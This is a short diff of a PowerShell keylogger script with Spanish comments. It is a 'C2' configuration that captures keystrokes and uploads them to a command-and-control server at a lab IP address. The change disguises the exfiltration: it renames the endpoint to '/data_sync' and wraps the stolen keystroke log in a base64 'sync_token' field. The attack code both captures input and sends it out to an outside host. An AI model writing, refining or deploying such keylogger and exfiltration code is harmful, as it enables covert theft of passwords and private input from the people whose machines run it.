@@ -1,5 +1,5 @@
 # Configuración C2
-$C2_URL = "http://192.168.56.20:5000"
+$C2_URL = "http://192.168.56.20:5000/data_sync"
 
 # Función para capturar teclado (Uso de librerías de .NET)
 $signatures = @'
@@ -22,7 +22,7 @@ while($true) {
         $body = @{sync_token = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($log))}
         $client = New-Object
         System.Net.WebClient
-        $client.UploadString($C2_URL, $log)
+        $client.UploadString($C2_URL, $body)
         $log = ""
     }
 }
